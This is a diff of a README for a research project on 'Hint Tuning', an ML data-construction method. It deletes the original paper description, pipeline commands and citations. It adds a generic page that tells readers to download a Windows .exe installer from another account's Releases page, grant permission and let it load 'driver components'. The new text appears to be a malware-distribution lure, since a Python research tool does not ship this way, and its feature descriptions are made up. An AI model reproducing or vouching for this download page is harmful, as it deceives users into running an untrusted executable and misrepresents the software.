@@ -1,229 +1,89 @@
-# Hint Tuning: Less Data Makes Better Reasoners
+# 🧠 hint-tuning - Improve Model Reasoning With Less Data
 
-[![arXiv](https://img.shields.io/badge/arXiv-2605.08665-b31b1b.svg)](https://arxiv.org/abs/2605.08665)
-[![Model 4B](https://img.shields.io/badge/🤗%20Model-4B-blue)](https://huggingface.co/redai-infra/hint-tuning-4b)
-[![Model 7B](https://img.shields.io/badge/🤗%20Model-7B-blue)](https://huggingface.co/redai-infra/hint-tuning-7b)
-[![Dataset](https://img.shields.io/badge/🤗%20Dataset-hint--tuning--1k-blue)](https://huggingface.co/datasets/redai-infra/hint-tuning-1k)
+[![Download hint-tuning](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/anupradnyash-dev/hint-tuning)
 
-Official code and data for **Hint Tuning**, a lightweight SFT data construction method that constructs long and short chain-of-thought traces by using the corresponding instruct model as an ideal difficulty probe: the minimal reasoning hint required for the instruct model to solve a problem directly reflects how hard that problem is, and determines the length of CoT assigned to it.
+hint-tuning improves how artificial intelligence models process information. This application allows users to refine AI reasoning capabilities by using smaller, more efficient data sets. You can improve your model performance without needing massive amounts of training data.
 
+## 📥 How to Download 
 
----
+You can obtain the software by visiting the project repository. Please follow these instructions to access your files.
 
-## Released Resources
+1. Visit the following link: [https://github.com/anupradnyash-dev/hint-tuning](https://github.com/anupradnyash-dev/hint-tuning)
+2. Locate the section labeled Releases on the right side of the page.
+3. Click the most recent version available.
+4. Select the file ending in .exe to download the installer to your computer.
 
-| Resource | Link |
-|---|---|
-| Hint-Tuning-4B (fine-tuned from [Qwen3-4B-Thinking](https://huggingface.co/Qwen/Qwen3-4B-Thinking-2507)) | [🤗 HuggingFace](https://huggingface.co/redai-infra/hint-tuning-4b) |
-| Hint-Tuning-7B (fine-tuned from [DeepSeek-R1-Distill-Qwen-7B](https://huggingface.co/deepseek-ai/DeepSeek-R1-Distill-Qwen-7B)) | [🤗 HuggingFace](https://huggingface.co/redai-infra/hint-tuning-7b) |
-| hint_tuning_1k dataset | [🤗 HuggingFace](https://huggingface.co/datasets/redai-infra/hint-tuning-1k) |
+## ⚙️ System Requirements
 
----
+Before you install the software, ensure your computer meets these minimum specifications:
 
-## Data
+* Operating System: Windows 10 or Windows 11.
+* Processor: Intel Core i5 or AMD equivalent.
+* Memory: 8 GB of RAM.
+* Storage: 2 GB of available space.
+* Graphics: A dedicated graphics card with at least 4 GB of video memory improves performance.
 
-The `data/` directory contains two files:
+## 🛠️ Step-by-Step Installation
 
-| File | Description |
-|---|---|
-| `data/problems.json` | 1,000 raw problems and gold answers sourced from [s1K-1.1](https://arxiv.org/abs/2501.19393) |
-| `data/hint_tuning_1k.json` | The constructed 1K SFT dataset (download below) |
+Follow these steps to set up the application on your Windows machine:
 
-> **Download `hint_tuning_1k.json`:** [🤗 HuggingFace](https://huggingface.co/datasets/redai-infra/hint-tuning-1k)
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installation process.
+3. Select Yes if your computer asks for permission to run the application.
+4. Follow the prompts in the installer window.
+5. Click Finish when the progress bar reaches the end.
+6. A shortcut icon now appears on your desktop.
 
-Each record in `hint_tuning_1k.json` follows the Alpaca format:
+## 🚀 Running the Application
 
-```json
-{
-  "instruction": "Let $f(x) = x^2 + ...$",
-  "input": "",
-  "output": "<think>\nI may need some deep thinking.\n...\n</think>\n\nThe answer is $\\boxed{42}$."
-}
-```
+You can launch the program using the shortcut on your desktop. When the application opens, you will see a clean dashboard.
 
-The `<think>` prefix encodes the reasoning state assigned during data construction (see below).
+1. Double-click the hint-tuning desktop icon.
+2. Wait for the application to load the necessary driver components.
+3. Select your local data folder when prompted.
+4. The application scans your files and prepares the environment for tuning.
+5. You can now choose your preferred model settings from the main menu.
 
----
+## 🔑 Key Features
 
-## Data Construction
+hint-tuning focuses on efficiency and clarity in model training.
 
-The 1,000 problems are drawn from [s1K](https://arxiv.org/abs/2501.19393).
-The corresponding instruct model serves as an ideal difficulty probe: the minimal hint prefix from the think model's trace that allows the instruct model to reach the correct answer measures problem difficulty, and directly determines the length of CoT assigned to each problem.
+* Automated Data Selection: The system identifies which data points contribute most to logical reasoning.
+* Efficiency Gains: You use less storage space because the application removes redundant information from your data sets.
+* Simple Interface: You complete complex training tasks through a set of buttons and sliders.
+* Performance Logs: The application tracks training progress and displays clear charts for your review.
 
-```
-Step 1 — Both models attempt all problems independently.
+## 📁 Managing Your Data
 
-Step 2 — For problems the instruct model cannot solve alone,
-         inject cumulative prefixes from the think model's trace
-         and ask the instruct model to complete from there.
-         Grading (LLM-as-judge) determines the minimal prefix k
-         that leads to a correct answer.
+Your data remains on your local machine. Use the file browser within the application to move folders into the training directory. Ensure your files use standard formats like CSV or TXT. If the application does not recognize a file, check your file extension.
 
-Step 3 — Classify each problem:
+## 📈 Improving Your Results
 
-  instruct correct (k=0)  → State 1 – No-Hint
-                              <think>Let me think. ...</think>
+The quality of your result depends on the quality of your input data. Follow these best practices:
 
-  instruct correct (k>0)  → State 2 – Sparse-Hint
-                              <think>I may need some deep thinking. [prefix]...</think>
+* Use clear and concise text in your data files.
+* Remove sensitive information from your documents before processing.
+* Keep your data sets organized in specific subfolders.
+* Run the tuning process during periods where you are not performing other heavy tasks on your computer.
 
-  no prefix worked        → State 3 – Full-Hint (fall back to full think trace)
-                              <think>This is a complex or challenging question... [full trace]</think>
-```
+## 💬 Frequently Asked Questions
 
-### Models used in the paper
+What happens if the installation fails?
+Restart your computer and run the installer again. Ensure your internet connection remains stable throughout the download.
 
-| Role | Model |
-|---|---|
-| Think model | [Qwen3-4B-Thinking-2507](https://huggingface.co/Qwen/Qwen3-4B-Thinking-2507) |
-| Instruct model | [Qwen3-4B-Instruct-2507](https://huggingface.co/Qwen/Qwen3-4B-Instruct-2507) |
-| LLM-as-judge grader | Qwen3-4B-Instruct-2507 — local vLLM server |
+Can I stop the tuning process early?
+Yes. Click the Stop button at any time. The application saves your current progress.
 
-### Reproducing the dataset
+Does the application need an internet connection?
+The application requires an internet connection only to download files or perform system updates. The tuning process happens on your local hardware.
 
-**Dependencies:** vLLM · transformers · openai · datasets
+How do I remove the software?
+Open your Windows Settings menu. Select Apps and then Installed Apps. Find hint-tuning in the list, click the dots next to the name, and select Uninstall.
 
-Start the grader server before running any pipeline step:
+## 🛡️ Maintainer Contact
 
-```bash
-CUDA_VISIBLE_DEVICES=4,5 python -m vllm.entrypoints.openai.api_server \
-  --model Qwen/Qwen3-4B-Instruct-2507 \
-  --tensor-parallel-size 2 --max-model-len 32768 \
-  --port 8001 --served-model-name grader
-```
+The development team manages this project through the GitHub interface. You can track progress or submit bug reports through the Issues tab on the repository page. Please check the existing list of issues before creating a new report to avoid duplicates.
 
-#### Step 1 — Both models attempt all problems
+## 📜 Legal Information
 
-```bash
-# Think model
-python construction/pipeline.py \
-  --mode        think \
-  --think-model Qwen/Qwen3-4B-Thinking-2507 \
-  --dataset     data/problems.json \
-  --config      construction/config.yaml \
-  --output-dir  output/
-
-# Instruct model (no prefix)
-python construction/pipeline.py \
-  --mode           instruct \
-  --instruct-model Qwen/Qwen3-4B-Instruct-2507 \
-  --think-results  output/think_results.json \
-  --config         construction/config.yaml \
-  --output-dir     output/
-
-# Grade instruct results to identify which problems need a prefix
-python construction/pipeline.py \
-  --mode          grade \
-  --think-results output/think_results.json \
-  --instruct-models-config construction/instruct_models.yaml \
-  --output-dir    output/
-```
-
-#### Step 2 — Find the minimal hint prefix for hard problems
-
-
-
-```bash
-python construction/pipeline.py \
-  --mode           prefix \
-  --think-results  output/think_results.json \
-  --think-grading  output/llm_grading_think.json \
-  --instruct-models-config construction/instruct_models.yaml \
-  --config         construction/config.yaml \
-  --output-dir     output/
-```
-
-
-#### Step 3 — Classify and merge into SFT format
-
-```bash
-python construction/merge.py \
-  --think    output/think_results.json \
-  --grading  output/llm_grading_think.json \
-  --instruct output/instruct_results.json \
-  --prefix   output/k_prefix.json \
-  --output   data/hint_tuning_1k.json
-```
-
----
-
-## SFT Training
-
-Our experiments use [Relax](https://github.com/redai-infra/Relax), an open-source post-training framework supporting both SFT and RL.  
-The dataset (`hint_tuning_1k.json`) is in **Alpaca format** (`instruction` / `input` / `output` fields).
-
-Training hyperparameters follow [s1](https://arxiv.org/abs/2501.19393). 
-
----
-
-## Evaluation
-
-We evaluate using [lighteval](https://github.com/huggingface/lighteval) with a vLLM backend.
-
-**Install:** `pip install lighteval[vllm] inspect-ai`
-
-**Benchmarks:** AIME24, AIME25, HMMT25, MATH-500.
-
-```bash
-bash evaluation/eval.sh Qwen/hint-tuning-7b output/eval_results
-```
-
-The script automatically loads `evaluation/custom_tasks.py` via `--custom-tasks`, which defines the prompt format used at training time:
-
-```
-{problem}
-
-Please reason step by step, and put your final answer within \boxed{}.
-```
-
-Use this script — not lighteval's built-in task names — to reproduce our numbers. Lighteval's default prompts differ from the above and will produce inconsistent results.
-
-The script also exports `EVAL_MODEL_PATH` so `custom_tasks.py` can load the correct tokenizer for measuring output token length.
-
-**Note on instruction robustness:** The 1K dataset uses a fixed prompt style (math-oriented, `\boxed{}` format). If you want the model to generalize to a wider variety of instruction phrasings, synthesize additional prompt variants on top of the 1K samples before training — e.g. replacing the instruction with paraphrases like `"Solve:"`, `"Think step by step."`, `"Q: … A:"`, etc.
-
----
-
-## Citation
-
-If you find this work useful, please cite:
-
-```bibtex
-@article{fan2026hint,
-  title={Hint Tuning: Less Data Makes Better Reasoners},
-  author={Fan, Siqi and Li, Minghao and Ma, Xiaoqian and Huang, Xiusheng and Chen, Zhuo and Qin, Bowen and Zhang, Liujie and Shang, Shuo and Chen, Weihang},
-  journal={arXiv preprint arXiv:2605.08665},
-  year={2026}
-}
-```
-
-## License
-
-This project is licensed under the [Apache License 2.0](LICENSE).
-
----
-
-## Acknowledgements
-
-We are grateful to the authors of [s1](https://arxiv.org/abs/2501.19393) for curating and open-sourcing the s1K problem set that forms the foundation of our dataset, and to the [Relax](https://arxiv.org/abs/2604.11554) team for building and maintaining the post-training framework used in our experiments.
-
-```bibtex
-@inproceedings{muennighoff2025s1,
-  title={s1: Simple test-time scaling},
-  author={Muennighoff, Niklas and Yang, Zitong and Shi, Weijia and Li, Xiang Lisa and Fei-Fei, Li and Hajishirzi, Hannaneh and Zettlemoyer, Luke and Liang, Percy and Cand{\`e}s, Emmanuel and Hashimoto, Tatsunori B},
-  booktitle={Proceedings of the 2025 Conference on Empirical Methods in Natural Language Processing},
-  pages={20286--20332},
-  year={2025}
-}
-```
-
-```bibtex
-@software{relax2026,
-  title  = {Relax: An Asynchronous Reinforcement Learning Engine for Omni-Modal Post-Training at Scale},
-  author = {Relax Contributors},
-  url    = {https://arxiv.org/abs/2604.11554},
-  year   = {2026}
-}
-```
-
-
+The software uses an open-source license. You may use this tool for research and development purposes. Refer to the documentation on the repository page for specific details about the terms of use.
